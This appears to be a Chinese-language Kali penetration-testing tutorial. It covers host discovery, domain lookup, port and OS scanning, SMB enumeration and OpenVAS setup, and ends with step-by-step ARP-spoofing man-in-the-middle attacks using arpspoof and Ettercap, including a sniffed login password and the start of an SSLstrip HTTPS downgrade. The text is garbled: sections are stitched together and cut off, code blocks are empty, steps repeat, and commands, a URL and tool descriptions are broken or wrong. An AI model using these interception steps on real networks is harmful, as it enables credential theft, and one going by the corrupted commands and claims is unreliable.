在上一章中，我们学习了一些网络规则，这些规则对于理解 `Nmap` 等工具的重要性至关重要。网络本身是一个庞大的的话题，但作为黑客，我们建议你通过学习各种网络原理和协议来良好掌握这一主题。

用户可以通过主动扫描确定目标主机是否活跃。主动扫描是通过发送探测请求包并等待目标主机的响应完成的。如果目标主机响应了请求，意味着该主机是活跃的。否则，我们可以得出目标主机未在线的结论。

本节将介绍几种主动扫描主机的方法。

#### 1) 使用 Nmap 工具

`Nmap` 是一个非常强大的网络扫描和嗅探工具包。该工具有三个基本功能。三个功能中的第一个是检测一组主机是否在线。第二个是扫描主机端口并嗅探提供的网络服务，而第三个是推断主机正在使用的操作系统。

以下示例将介绍如何使用 `Nmap` 工具检测目标主机是否在线。

`Nmap` 的语法格式如下：
```
nmap -sP [target]
```
上述语法中的 `-sP` 选项意味着对目标主机执行 Ping 扫描。参数 `[target]` 用于指定扫描的目标地址。此处的目标可以是主机名、IP 地址（包括单个地址、多个地址或地址范围），甚至是网络网段。

**使用场景：**
检测目标主机 `72.132.234.64` 是否在线。
执行命令如下：
```
root@exampleserver:～# nmap -sP 72.132.234.64
```
你也可以同时检查多个主机。下面我们为该场景提供了一个示例供你参考。

**使用场景：**
使用 `Nmap` 检测主机 `72.132.234.64`、`72.132.234.65` 和 `72.132.234.66` 是否在线。
执行命令如下：
```
root@exampleserver:～# nmap -sP 72.132.234.64-66
```
这会显示这些主机的可用性。

### 2) 使用 Netdiscover 工具

`Netdiscover` 是一个支持主动和被动模式的 ARP 探测工具。你可以使用该工具扫描网络上的 IP 地址并检查在线的主机。

本节将介绍使用 `Netdiscover` 工具实现主动扫描。

语法格式如下：
```
netdiscover -r [range]
```
上述语法中的 `-r [range]` 选项用于指定扫描的网络范围。如果用户未指定目标，会自动选择网络。

**使用场景：**
使用 `Netdiscover` 工具扫描 `72.132.234.64/24` 网段中的在线主机。
执行命令如下：
```
root@exampleserver:～# netdiscover -r 72.132.134.64/24
```
通过分析捕获的数据包，可以知道当前主机的 IP 地址和 MAC 地址。扫描完成后将显示获取的信息。如果你仔细观察尝试攻击的主机信息，按 `Ctrl+C` 键退出 `Netdiscover` 界面。用户有时也可以不指定范围，尽可能寻找在线主机。执行命令如下：
```
root@exampleserver:～# netdiscover
```

## 监控主机

监控主机意味着不向目标发送数据包，而监控网络中的数据包。在局域网中，某些协议会自动广播数据包，例如 ARP 广播和 DHCP 广播。用户可以通过接收这些广播包来检测网络上的在线主机。

### 1) ARP 监控

ARP（地址解析协议）是一种根据 IP 地址获取物理地址的 TCP/IP 协议。当主机发送信息时，向网络上的所有主机广播 ARP 请求并接收返回消息。

本节将介绍使用 `Netdiscover` 工具的被动模式进行 ARP 监控以发现主机。语法格式如下：
```
netdiscover -p
```
上述语法中的 `-p` 选项意味着使用被动模式，即不需要发送数据包，仅允许嗅探。从第一行的输出中可以理解扫描是以被动模式进行的。从第二行信息中，你可以看到嗅探包的数量、主机数量和包大小。第三行信息将关于嗅探包。你可以从 IP 列看到在线主机。许多其他任务可以使用此命令完成。我们建议你尝试这些命令以更好地理解该主题。

### 2) DHCP 嗅探

DHCP（动态主机配置协议）是一种局域网协议，其主要功能为内部网络或服务提供自动分配 IP 地址。当客户端需要获取 IP 地址时，它会发送广播包。接收接收请求的 DHCP 服务器将为客户端提供可用 IP 地址。因此，用户可以实现 DHCP 嗅探来检测网络中的在线主机。

本节将介绍通过 `Nmap` 的 `broadcast-dhcp-discover` 脚本发现主机。`Nmap` 的 `broadcast-dhcp-discover` 脚本可发送 DHCP 广播包，并有效显示响应包的具体信息。通过分析响应包中的信息，可以找到可分配的 IP 地址。使用该脚本进行被动扫描的语法格式如下：
```
root@exampleserver: nmap --script broadcast-dhcp-discover
```
上述语法中的 `--script` 选项用于指定用于攻击的脚本。

## 第 11 章 域名分析

![](img/Image00004.jpg)

在上一章中，我们讨论了扫描主机时使用的步骤。虽然扫描被认为是一个简单的过程，但由于为了检测恶意扫描请求而快速发展的入侵检测系统，现在它通常是不可行的。为了应对这个问题并以更好的方式分析我们的目标，我们需要理解域名分析的重要性。跟随本章以良好掌握它。

### 什么是域名？

域名是一组由点分隔的名称字符串，通常用于代表互联网上某台计算机或计算机组的名称。它可以识别数据传输期间计算机的电子位置。通常，外部网络上的主机是通过域名识别的。如果你想对外部网络的主机进行渗透测试，那么必须分析域名以获取域名的详细信息。我们可以找到不同的敏感参数，如域名所有者信息、子域名名、服务器地址。本节将通过几个示例介绍如何分析域名信息。

### 基础域名信息

当域名被注册时，它包含基础信息，如域名是否已注册、域名注册机构、域名所有者等。通过检查域名的 `WHOIS` 信息，可以轻松获取域名的基础信息。本节将介绍如何使用 `WHOIS` 和其他流行工具获取域名的基础信息。常说在分析目标之前，域名分析是渗透者的首要工作。

### 1) 使用 WHOIS 工具

`WHOIS` 工具用于查找并显示指定账户（或域名名）的相关信息。使用该工具查询域名信息的语法格式如下：
```
whois [domain name]
```
这里 `domain name` 是要查询的域名。

**使用场景：**
使用 `WHOIS` 工具查询域名 `wikipedia.com` 的相关信息。执行命令如下：
```
root@exampleserver:～# whois wikipedia.com
```
在终端上输入上述命令后，你可以看到域名的相关信息。

### 2) 使用 Dmitry 工具

`dmitry` 是一个信息收集工具。渗透者通常使用此工具收集域名信息、子域名、域名中包含的电子邮件地址等。使用此工具获取 WHOIS 信息的语法格式如下：
```
dmitry -w [domain]
```
`-w`：对指定的域名执行 WHOIS 查询。

**使用场景：**
使用 `dmitry` 工具查询域名 `wikipedia.com` 的 WHOIS 信息。执行命令如下：
```
root@exampleserver:～# dmitry -w wikipedia.com
```
通过在终端中使用上述命令，将成功获取域名的 WHOIS 信息。

### 查找子域名

子域名也被渗透者视为一个域名。在域名系统中，通常属于顶级域名。例如，`www.wikipedia.com` 和 `forum.wikipedia.com` 是 `wikipedia.com` 的子域名。`www` 是标识服务器的主机名。查找域名可以找到对应的主机。下面将通过示例说明查找子域名的方法。

### 1) 使用 Dmitry 工具

`dmitry` 工具可用于查找子域名。然而，如果你访问被 Google 黑名单的网站，使用 Google 搜索引擎查找子域名有时可能不可靠。所以请确保你的域名与 Google 兼容。使用 `dmitry` 工具查找子域名的格式如下：
```
dmitry -s -o
```
上述语法中的选项和含义为：
- `-s`：执行子域名查询。
- `-o`：指定输出的文件。

**使用场景：**
使用 `dmitry` 工具查找域名 `wikipedia.com` 的子域名。执行命令如下：
```
root@exampleserver:～# dmitry -s -o wikipedia.com
```
在 Linux 终端输入上述命令，你可以看到 `wikipedia.com` 的所有子域名和对应的 IP 地址。

### 2) 在线查询

用户也可以通过在线查询技术搜索子域名。其中，在线查询域名的常用地址是访问以下网站（https://phpinfo）。当用户成功在浏览器访问地址时，会显示请求域名的界面。在文本框输入要查询的域名，然后点击“Start”按钮查找对应的子域名。例如，我们可以找到域名 `wikipedia.com` 的不同子域名。立即显示 `wikipedia.com` 的可用子域名

现在你已经熟悉了查找子域名的技术以及特定域的属性。但重要的是，管理员和开发者经常限制匿名用户（即渗透测试人员）访问信息。因此，不完全依赖域名分析是重要的。在下一章中，我们将通过引入发现服务器的步骤来应对这个问题。

## 第 12 章 发现服务器

![](img/Image00004.jpg)

虽然域名方便人们记忆，但网络中的计算机只能知道彼此的 IP 地址。因此，你需要根据域名查询对应的主机。在域名服务器中，通过域名记录如 `A` 记录、`MX` 记录和 `NS` 记录识别不同的主机。其中，`A` 记录代表主机；`MX` 记录代表邮件服务器；`NS` 代表 DNS 服务器。每个域名记录包含一个 IP 地址。用户可以通过检测域名服务器确定对应对应的 IP 地址。下面将通过有效的指令说明发现服务器的方法。

### 1) 使用 Dnsenum 工具

`dnsenum` 是一个域名信息收集工具。它可以通过 Google 或字典文件猜测可能的域名，并能有效地对网段执行反向查询。它还可以查询网站的主机地址信息、域名服务器和邮件交换记录。

使用该工具收集域名信息的语法格式如下：
```
dnsenum -w
```
上述语法中的 `-w` 表示在网络范围内执行 WHOIS 查询。

**使用场景：**
使用 `dnsenum` 枚举子域名 `wikipedia.com` 的信息。执行命令如下：
```
root@exampleserver:～# dnsenum -w wikipedia.com
```
如果你在终端输入上述代码，你可以看到子域名 `www.wikipedia.com` 的 IP 地址。

### 3) 使用 Ping 命令

`Ping` 命令可检查网络是否连接。这通常有助于用户分析和判断网络故障。对于域名，通常可以指定多个 IP 地址。此时用户无法确定目标服务器使用的是哪个地址。使用 `Ping` 命令确定目标主机。`ping` 命令的语法格式如下：
```
ping -c [count][target]
```
在上述语法中，选项 `-c` 用于指定发送 `Ping` 包的数量，参数 `[target]` 用于指定目标主机地址，地址可以是主机名、IP 地址或域名。在 Windows 系统中，`Ping` 命令只发送并响应 4 个包即停止。在 Linux 系统中，`Ping` 命令默认一直执行，用户需要按下 `Ctrl+C` 组合键停止。

**使用场景：**
使用 `Ping` 命令检测域名 `wikipedia.com` 的 IP 地址，并指定只发送 4 个包。执行命令如下：
```
root@exampleserver:～# ping -c 4 wikipedia.com
```
输入上述命令后，我们可以看到成功接收来自目标主机的响应包。从响应包信息可以看到目标发出的 IP 地址。





### 保留端口

此类端口的取值范围为 0～1023。这些端口在用户编程期间无法使用，而是由某些程序使用。只有具有超级用户权限的应用程序才允许分配保留端口。例如，WWW 服务的默认端口为 `80`，FTP 服务的默认端口为 `21`。不过，用户也可以为这些网络服务指定其他端口。某些系统协议使用固定端口号且无法更改。例如，端口 `139` 专门用于 NetBIOS 和 TCP/IP 之间的通信，无法手动更改。

### 注册端口

此类端口的范围在 1024～49151 之间，这是用户在编写服务器时使用的端口号范围。当这些资源未被服务器占用时，客户端也可以动态选择这些端口。客户端使用的端口号也称为临时端口，取值范围为 49152～65535。

### 实现端口扫描

在用户对端口概念有清晰了解后，就可以实现端口扫描。本节将介绍如何使用 `Nmap` 和 `DMitry` 工具来实现端口扫描。

#### 1) 使用 Nmap 工具

通常建议使用 `Nmap` 工具进行端口扫描。通过使用 `Nmap`，你可以识别六种端口状态，即 `open`（开放）、`closed`（关闭）、`filtered`（过滤）、`unfiltered`（未过滤）、`open/filtered`（开放或被过滤）以及 `closed/filtered`（关闭或被过滤）。如果你想使用 `Nmap` 工具进行端口扫描，需要理解每个端口状态的含义。下节将介绍这 6 种端口状态的具体含义。

#### Open (开放)

在这种情况下，应用程序通常在该端口上接收 TCP 连接或 UDP 数据包。具有安全意识的人知道，每个开放端口都是攻击的入口。攻击者或渗透测试想要发现开放端口，而管理员则尝试关闭它们或使用防火墙进行保护，以防阻止合法用户使用。非安全扫描可能对开放端口感兴趣，因为它们显示了网络上有哪些可用。

#### Closed (关闭)

关闭端口也可以被 `Nmap` 访问（它会接收 `Nmap` 检测消息并响应），但显而易见没有应用程序在上面监听。它们可以显示 IP 地址的主机（主机发现或 ping 扫描）正在运行，还可以帮助检测某些操作系统。因为关闭端口是可访问的，某些端口在一段时间后可能会再次被打开。系统管理员可以使用防火墙拦截此类端口。通过这种，它们将显示为被过滤。

#### Filtered (被过滤)

由于数据包过滤阻止了探测包到达端口，`Nmap` 无法确定端口是否开放。过滤可能来自专业的防火墙设备、路由器规则或主机上的软件防火墙。有时它们会响应 ICMP 错误消息，例如类型 3 码 13（无法到达目标：由管理员禁止通信），但更通常的情况下，过滤器直接丢弃探测帧而不进行任何响应。`Nmap` 会重试几次以检测探测包是否由于网络拥塞而被丢弃。这将导致扫描速度显著变慢。

#### Unfiltered (未过滤)

未过滤状态意味着端口是可以访问的，但 `Nmap` 无法确定它是开放还是关闭的。用户仅通过对映射防火墙规则集的 ACK 扫描将端口归入此类状态。使用其他类型的扫描（如窗口扫描、SYN 扫描或 FIN 扫描）扫描未过滤端口，可以帮助确定端口是否开放。

#### Open/filtered (开放或被过滤)

当无法确定端口是开放还是被过滤时，`Nmap` 将端口分为此类状态。这发生在开放端口没有响应的情况下。没有响应也可能意味着消息过滤器丢弃了探测消息以及由此产生的任何响应消息。因此，`Nmap` 无法确定端口是开放还是被过滤。UDP、IP 协议、FIN、Null 和 Xmas 扫描可能属于此类类。

#### Closed/filtered (关闭或被过滤)





当 `Nmap` 无法确定端口是关闭还是被过滤时，使用此状态。它只会出现在 `IPID` 空闲扫描中。使用 `Nmap` 进行端口扫描的语法格式如下：

`nmap -p [target]`

在上述语法中，选项 `-p` 用于指定要扫描的端口。指定的端口可以是单个端口、多个端口或一个端口范围。当指定指定多个扫描端口时，用逗号分隔端口。默认情况下，`Nmap` 扫描的端口范围是 1 到 1000。

用场景：
对目标主机 `192.243.176.84` 执行端口扫描。执行命令如下：
```
root@exampleserver:～# nmap 192.243.176.84 own
```
当在终端上输入此命令时，`Nmap` 工具默认扫描 1000 个端口。它将在输出中显示开放的端口。

用场景：
指定端口范围为 1 到 50，并对目标主机 `192.243.176.84` 执行端口扫描。执行命令如下：
```
root@exampleserver:～# nmap -p 1-50 192.243.176.84
```
从输入上述终端后的输出结果中，我们可以看到扫描了 1 到 50 的端口范围。所有开放的端口都将显示。

用场景：
指定扫描目标主机的 21 和 23 端口。执行命令如下：
```
root@exampleserver:～# nmap -p 21,23 192.243.176.84
```
这提供了关于命令专门请求的两个部分的详细信息。通过使用这些技术，你可以最大限度地减少通常扫描端口所需的时间。

## 2) 使用 `DMitry` 工具
`DMitry` 工具提供 `-p` 选项来实现端口扫描。实现端口扫描的语法格式如下：

`dmitry -p [host]`

这里 `host` 是我们尝试扫描端口的宿主机 IP 地址。

用场景：
使用 `DMitry` 扫描目标主机 `192.243.176.84` 上的开放端口。执行命令如下：
```
root@exampleserver:～# dmitry -p 192.243.176.84
```
从输出信息中，你可以看到目标主机上所有开放的端口。从输出的倒数第二行，你可以看到扫描的端口数量和关闭的端口数量。

### 基于 TTL 的识别
`TTL`（存活时间），此字段指定了 IP 数据包在被路由器丢弃之前允许通过的最大网络段数。不同的操作系统会有不同的 `TTL` 值响应。因此，用户可以使用 `Ping` 命令进行系统识别。为了让用户快速确定目标类型，有必要提供每个操作系统的初始 `TTL` 值列表。你可以通过快速 Google 搜索轻松找到它们。

用场景：
使用 `Ping` 测试目标主机 `192.243.176.84` 的操作系统类型。目标主机的操作系统类型是 Linux。让我们看看命令是否可以检测到它。执行命令如下：
```
root@exampleserver:～# ping -c 1 192.243.176.84
```
从输出信息中可以看到，响应包中的 `TTL` 值为 `64`。可以推断该主机是 Linux 操作系统。

用场景：
使用 `Ping` 测试目标主机 `192.243.176.84` 的操作系统类型。目标主机的操作系统类型是 Windows 7。执行命令如下：
```
root@exampleserver:～# ping -c 1 192.243.176.84
```
从输出信息中可以看到，响应包中的 `TTL` 值为 `128`。可以解释为 Windows 操作系统。提示：如果从本地主机到目标的路由器太多，判断结果可能不准确。

### 使用 `NMAP` 识别
由于 `TTL` 仅是模糊判断，获得的结果可能不准确。`NMAP` 工具提供了检测操作系统的功能。本节将介绍如何使用 `NMAP` 识别操作系统类型。使用 `NMAP` 识别操作系统的语法格式如下：

`nmap -O [target]`

这里 `target` 是我们进行渗透测试时尝试攻击的主机地址。

用场景：
使用 `NMAP` 检测目标主机 `192.243.176.84` 的操作系统类型。执行命令如下：
```
root@exampleserver:～# nmap -O 192.243.176.84
```
从输出信息中，我们可以了解到目标主机的操作系统类型被识别为 Microsoft Windows 7/8。虽然无法确定具体是哪一个版本，但会显示更接近的系统版本。虽然 `Dmitry` 提供相同的功能，但根据我们的经验，它在扫描过程中会出现更多错误。我们强烈建议仅使用 `Nmap` 来查找宿主机操作系统。

## 第 15 章：识别服务

### 使用 `nmap` 工具
`nmap` 工具提供了 `-sV` 选项来识别服务的版本。本节将介绍使用 `nmap` 配合该选项识别服务的技术。使用 `nmap` 识别服务的语法格式如下：

`nmap -sV [host]`

上述语法中的 `-sV` 选项意味着实现服务版本检测。

用场景：
识别目标主机 `192.243.176.84` 上所有的开放服务和版本。执行命令如下：
```

```
从输出信息中，我们可以看到识别出的服务相关信息。输出信息包括四列：`PORT`、`STATE`、`SERVICE` 和 `VERSION`。通过分析每一列信息，可以获取对应的服务信息。例如，端口 `21` 对应 `FTP` 服务，版本为 `FileZilla ftpd`。从输出的倒数第二行看到目标主机名为 `TEST-PC`，操作系统类型为 Windows。

### 使用 `smbclient` 工具
`smbclient` 是一组用于识别网络服务的渗透测试工具，其中 `smbclient` 工具通过发送数据包来识别运行在异常端口的应用程序。本节将介绍使用 `smbclient` 工具识别服务信息。

#### 1) 使用 `smbclient` 工具
`smbclient` 工具可以向 `UDP` 或 `SSL` 端口发送数据以获取信息。使用该工具识别服务的语法格式如下：

`smbclient -L -U <username> [host][port] -v`

这里的 `-v` 代表详细模式。

用场景：
使用 `smbclient` 工具探测端口 `90`。执行命令如下：
```
root@exampleserver:～# smbclient -L -U root 192.243.176.84 90 -v
```
从显示结果中，可以理解获取的信息写入了触发文件和响应文件中。当用户使用 `smbclient` 工具识别服务时，这些文件将用于获取信息。

#### 2) 使用 `smbclient` 工具
`smbclient` 工具可以识别运行在异常端口的应用程序。使用该工具识别服务的格式如下：

用场景：
使用 `smbclient` 工具扫描目标主机 `192.243.176.84` 上的 `80` 服务。执行命令如下：
```

### SMB 服务
`SMB`（Server Message Block）是一种用于在计算机之间共享文件、打印机、串口等的协议。`SMB` 协议可以在 `TCP/IP` 协议之上工作，也可以在其他网络协议（如 `IPX`）之上工作。通过获取 `SMB` 服务的文件夹信息，可以了解目标主机的文件系统。本节将介绍使用 `smbclient` 工具获取文件夹信息。`smbclient` 是 `SMB` 服务的客户端工具，用于访问服务中的共享文件。该工具的语法格式如下：

`smbclient -L -U <username>`

上述语法中的选项含义为：
- `-L`: 用于指定 `SMB` 服务器地址。
- `-U`: 用于指定登录 `SMB` 服务的用户名。

用场景：
在 `Linux` 系统中访问 `SMB` 服务。执行命令如下：
```
root@exampleserver: # smbclient -L -U root 192.243.176.84
```
登录 `SMB` 服务用户密码后将显示需要分析的信息。从输出信息中，你可以看到目标 `SMB` 共享的文件。其中，`Sharename` 代表共享文件的名称，`Type` 代表磁盘类型，`Comment` 是共享文件的描述。可以解释目标主机的操作系统类型是 `Linux`，共享文件是 `Linux` 文件系统类型。如果目标主机的操作系统是 `Windows`，文件名列将显示共享文件夹的驱动器号。
```
root@exampleserver:～# smbclient -L -U root 192.243.176.84
```
从上述输出结果的文件可以看出，默认共享磁盘为 `C` 盘和 `E` 盘。只有在 `Windows` 系统中，文件夹以驱动器号的形式划分。可以判断共享文件夹是 `Windows` 系统类型。

### SNMP 服务
`SNMP`（简单网络管理协议）由一组网络管理标准组成，包括一个应用层协议和一组资源对象。该协议被网络管理系统用于监控网络设备上任何需要管理员注意的情况。通过使用此服务，可以获取主机信息。本节将介绍使用 `snmpcheck` 工具获取主机信息。`snmpcheck` 工具用于枚举 `SNMP` 设备以获取目标主机。。工具的语法格式如下：

用场景：

## 第 20 章：介绍 OpenVAS

OpenVAS 是一个开源的漏洞评估系统。也可以说它是一个包含相关工具的网络扫描器。它的核心组件是一个服务器，包含一组网络漏洞测试程序，可以检测远程系统和应用程序的安全问题。本节将介绍如何使用 OpenVAS 实现漏洞扫描。

## 安装并初始化 OpenVAS 服务

在 `Kali Linux 2019` 中，默认没有安装 `OpenVAS` 服务。因此，如果你想使用 `OpenVAS` 服务进行漏洞扫描，需要先安装该服务。此外，当服务成功安装后，需要初始化 `OpenVAS` 库。下节将介绍安装 OpenVAS 服务和初始化 OpenVAS 库的方法。

### 1) 安装 OpenVAS 服务

由于默认未安装，你需要输入 Linux 命令来启动服务，以便使用它进行漏洞扫描。
执行命令如下：

```bash
root@exampleserver:～# apt-get install openvas -y
```

执行上述命令后，系统将检测依赖环境并下载相应的软件包。然后，它将在终端环境中自动安装所有下载的包。如果安装过程中没有报告错误，则说明 `OpenVAS` 服务安装成功。如果你遇到任何错误，请检查其在线文档以清除错误。

### 2) 初始化 OpenVAS 库

用户成功安装 `OpenVAS` 服务后，需要对其进行初始化。在此过程中，`OpenVAS` 将根据最新的可用性下载许多文件（插件和漏洞数据）。这个过程需要很长时间，用户需要耐心等待。我们建议在这一步使用高速网络连接。

执行命令如下：

```bash
root@exampleserver:～# openvas-setup
```

从上面的输出信息中，你可以看到已经下载了大量文件且所有库都已更新。此外，最后顺序启动了 `OpenVAS` 相关服务，并自动生成了默认账户和密码。请记录下用户名和密码，以便在使用命令行界面尝试初始化时使用。密码通常是加密的。

**提醒：** 在 `Kali Linux 2019` 中，当所有 `OpenVAS` 服务成功启动后，浏览器会自动启动并显示 `OpenVAS` 的登录界面。

### 3) 初始化密码

当用户初始化 `OpenVAS` 服务时，系统默认会生成一个长字符串密码。这个密码既不容易输入也不记忆，显然不符合用户使用常用密码的习惯。因此，为了方便起见，你可以使用以下命令快速更改密码。

执行命令如下：

```bash
root@exampleserver:～# openvasmd --user=admin --new-password="this-is-my-new-password"
```

执行上述命令后，不会显示任何输出。但并不意味着密码没有更改。请再次运行设置命令检查密码是否已更改。

**注意：** 如果再次运行 `openvas-setup` 命令，同步速度将非常快，并显著提高速度。

### 4) 检查安装的完整性

在某些情况下，使用 `apt-get` 安装总是会导致各种类型的错误。此时，用户可以使用 `openvas-check-setup` 命令来排查错误。该命令不仅会指出错误位置，还会提示解决方案。

执行命令如下：

```bash
root@exampleserver:～# openvas-check-setup
```

从上述命令中，你需要了解软件将通过 9 个步骤进行检查。检查完成后，如果你看到“success prompt”消息，则说明 `OpenVAS` 安装成功。

### 5) 检查 OpenVAS 服务状态

当 `OpenVAS` 服务初始化后，你就可以访问该服务。为了确保访问 `OpenVAS` 服务没有问题，请在此检查其状态。用户可以使用 `netstat` 命令查看被监控的端口，并如下判断 `OpenVAS` 服务是否成功启动：

```bash
root@exampleserver:～# netstat
```

该命令显示 `OpenVAS` 服务已经启动。如果你没有看到与 `OpenVAS` 相关的监控程序结果，则说明服务未启动。

### 6) 设置外部访问

通过检查 `OpenVAS` 服务的监控状态，我们可以看到服务的默认监控地址为 `127.0.0.1`，这意味着允许本地主机访问。为了方便使用，用户需要手动配置外部访问。在这里，你需要将 3 个配置文件中的监听 IP 从 `127.0.0.1` 修改为 `0.0.0.0`（代表任何 IP）。然后重启 `OpenVAS` 服务。

具体步骤如下：

1. 修改 `greenbone-security-assistant.service` 配置文件。在该文件中有两个地方需要修改。第一个是修改 `--listen` 和 `--mlisten` 的监听地址。第二个是增加 host header 的主机地址。
   首先，将监听地址设置为任何 IP (`0.0.0.0`)，如下：
   ```bash
   root@exampleserver:～# vi /usr/lib/systemd/system/greenbone-security-assistant
   ```
2. 增加 host header 的主机地址。如果不增加主机地址，外部访问时将出现以下错误信息：`The request contained an unknown or invalid Host header`。如果你尝试通过主机名或代理访问 `GSA`，请确保 `GSA` 设置为允许。在 `--mlisten=0.0.0.0` 之后添加 `--allow-header-host=IP 地址或域名`。其中，这台机器的 IP 地址为 `192.168.1.32`，即外部访问的 IP 地址为 `192.168.1.32`，如下：
   ```bash
   ExecStart=/usr/sbin/gsad --foreground --listen=0.0.0.0 --port=9392 --mlisten=0.0.0.0 --allow-header-host=192.168.1.32 --port=9392
   ```
3. 修改 `openvas-manager` 配置文件中的监听地址如下：
   ```bash
   root@exampleserver:～# vi /etc/default/openvas-manager
   MANAGER_ADDRESS=0.0.0.0
   ```
4. 修改 `greenbone-security-assistant` 配置文件中的监控地址。该文件有两个地方需要修改，即 `GSA_ADDRESS` 和 `MANAGER_ADDRESS`，如下：
   ```bash
   root@exampleserver:～# vi /etc/default/greenbone-security-assistant
   GSA_ADDRESS=0.0.0.0
   ```
5. 重启 `OpenVAS` 服务。执行命令如下：
   ```bash
   root@exampleserver:～# openvas-stop

## 第 22 章：理解嗅探

嗅探是网络管理员需要理解的一项技能。当数据包未加密时，黑客利用嗅探来窃取敏感信息（如密码）。这种攻击被称为“中间人攻击”。本章将帮助你理解嗅探以及中间人攻击的原理。

## 中间人攻击

中间人攻击（MITM）是黑客使用的常用攻击方法，其中最典型的攻击方法是 ARP 欺骗和 DNS 欺骗。简单来说，中间人攻击是拦截两个通信双方之间的数据并进行篡改，而双方在不知情的情况下进行。

## 工作原理？

当主机 A 和主机 B 通信时，如果主机 A 在 ARP 缓存中找不到主机 B 的 MAC 地址，会发送 ARP 广播到整个局域网。此时，主机 B 会响应：“我是主机 B，我的 MAC 地址是 XX-XX”。主机 A 会更新其缓存。当主机 A 再次与主机 B 通信时，数据包发送到路由器，路由器将其转发到主机 B。

## 实现中间人攻击

一旦你理解了中间人攻击的原理，就可以使用`arpoof`和`Ettercap`来实现中间人攻击。

### 1) 使用 arpoof 工具

`arpoof`是一种基于 ARP 地址欺骗的网络嗅探工具，主要适用于交换型局域网。

1. 开启路由转发。在攻击者主机上，执行命令如下：
```bash
root@exampleserver:～# echo 1> /proc/sys/ipv4/ip_forward
```
看到上述输出意味着路由转发已开启。如果未开启，目标主机将无法访问网络。

2. 查看攻击主机的 IP 地址和 ARP 缓存。首先检查 IP 地址：
```bash
root@exampleserver:～# ifconfig
```
从输出信息可以看到攻击主机 IP 地址为`192.168.29.134`，MAC 地址为`00:0c:29:79:95:e`。接着检查目标主机的 IP 地址和 ARP 缓存：
```bash
root@exampleserver:～# ifconfig
```
从输出信息可以看到目标主机 IP 地址为`192.168.29.135`，MAC 地址为`00:0c:29:6c:5d:69`。然后：
```bash
root@exampleserver:～# arp
```
从输出中可以看到主机上有一个网关的 ARP 条目。通过查看地址条目可以确定攻击主机尚未与目标主机通信。此时，只要两个主机通信，它们就会请求对方的 IP 和 MAC 地址。此时，ARP 攻击就可以实现。

`arpoof`的语法格式如下：
```bash
arpoof [options] host
```
选项含义如下：
- `-i`：指定使用的接口。
- `-t`：指定目标。如果不指定，将欺骗局域网内的所有主机。
- `-r`：实现双向欺骗。
- `Host`：指定要拦截的主机，通常是网关。

使用`arpoof`工具的具体步骤如下：

1. 开启路由转发。执行命令如下：
```bash
root@exampleserver:～# echo 1> /proc/sys/ipv4/ip_forward
```
2. 查看攻击主机的 IP 地址和 ARP 缓存。首先检查 IP 地址：
```bash
root@exampleserver:～# ifconfig
```
从输出信息可以看到攻击主机 IP 地址为`192.168.29.134`，MAC 地址为`00:0c:29:79:95:e`。检查目标主机的 IP 地址和 ARP 缓存：
```bash
root@exampleserver:～# ifconfig
```
从输出信息可以看到目标主机 IP 地址为`192.168.29.135`，MAC 地址为`00:0c:29:6c:5d:69`。然后：
```bash
root@exampleserver:～# arp
```
3. 对目标主机实施 ARP 攻击。执行命令如下：
```bash
root@exampleserver:～# arpoof -i eth0 -t
```
从输出信息可以看到攻击主机正在向目标主机发送 ARP 响应包，告诉目标主机网关的 MAC 地址为`00:0c:29:79:95:e`（攻击主机的 MAC 地址）。但真实的网关不同。这表明对目标主机的 ARP 欺骗已开始。

4. 对网关实施 ARP 攻击。执行命令如下：
```bash
root@exampleserver:～# arpoof -i eth0 -t 192.168.29.135 -r
```
从输出信息可以看到攻击主机向目标主机和网关发送了 ARP 响应包，告诉网关和目标主机它们的 MAC 地址均为`00:0c:29:79:95:e`。

**提醒：** 用户也可以通过一个命令同时对目标主机和网关实施 ARP 攻击。执行命令如下：
```bash
root@exampleserver:～# arpoof -i eth0 -t 192.168.29.135 -r
```

5. 检查目标主机的 ARP 缓存：
```bash
root@exampleserver:～# arp
```
从输出信息中可以看到主机上有两个 ARP 条目（网关和攻击主机的 ARP 条目）。从显示的 ARP 条目可以看到，网关和攻击主机的 MAC 地址是相同的。这表明目标主机已成功被 ARP 欺骗。

### 2) 使用 Ettercap 工具

Ettercap 是一种基于 ARP 地址欺骗的网络嗅探工具，主要适用于交换交换的局域网。下节将介绍如何使用`Ettercap`工具来实现中间人攻击。

1. 启动 Ettercap 工具。执行命令如下：
```bash
root@exampleserver:～# ettercap -G
```
执行上述命令后，将显示界面。这是`Ettercap`工具的图形界面。
2. 嗅探包。在菜单栏中点击`Sniff|Unified sniffing`命令或按`Ctrl+U`快捷键。将显示对话框。
3. 选择网络接口。在对话框中选择`eth0`，然后点击“OK”按钮。
4. 启动界面后，扫描所有主机。在菜单栏点击`Hosts|Scan`命令或按`Ctrl+S`快捷键。将显示界面。
5. 从输出信息可以看到扫描了 5 个主机。如果想要查看扫描主机列表，在菜单栏点击`Hosts|list`命令或按`Ctrl+H`快捷键。将显示界面。
6. 界面显示了 IP 地址和 MAC 地址。在此界面中选择一个主机作为目标（例如`192.168.29.2`），点击`Add to Target`按钮。
7. 启动嗅探后，在菜单栏点击`Start sniffing`命令或按`Shift+W`快捷键。这将开始 ARP 注入。
8. 嗅探开始后，在对话框中选择攻击选项。
9. 界面显示攻击已成功。
10. 停止嗅探，在菜单菜单中点击`Stop sniffing`命令。
11. 停止攻击后，在菜单栏点击`Mitm|Stop`命令。
12. `Ettercap`提供了两种模式：图形界面和命令行。命令行模式的语法如下：
```bash
ettercap -q -M arp:remote -P dns_spoof /192.168.29.139//192.168.29.2
```

root@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.135//192.168.29.2
```
看到上述输出表示对目标实施 ARP 欺骗已成功。
2. 此时，当目标主机访问 HTTP 协议网站时，将在攻击主机处监控。例如，登录 UNIX 论坛，当用户输入用户名并登录时，将在攻击主机处被监控，显示如下：
```
HTTP: 42.62.98.167:80->USER: testuser PASS: password
```
从输出信息可以看到目标主机访问 UNIX 论坛的登录信息被监控。用户名是`testuser`，密码是`password`。

###监控 HTTPS 数据

`HTTPS`（基于套层的 HTTP 或安全超文本传输协议）是一个带安全的 HTTP 通道。对于某些安全网站，如 Facebook 和银行网站，HTTPS 协议在 HTTP 下增加了 SSL 层，因此是加密的。此时，用户可以使用 SSLstrip 工具解密 SSL 加密数据并获取 HTTPS 数据内容。

1. 开启路由转发。执行命令如下：
```bash
root@exampleserver:～# echo 1> /proc/sys/ipv4/ip_forward
```
2. 通过`iptables`将所有 HTTP 数据重定向到端口 10000。执行命令如下：
```bash
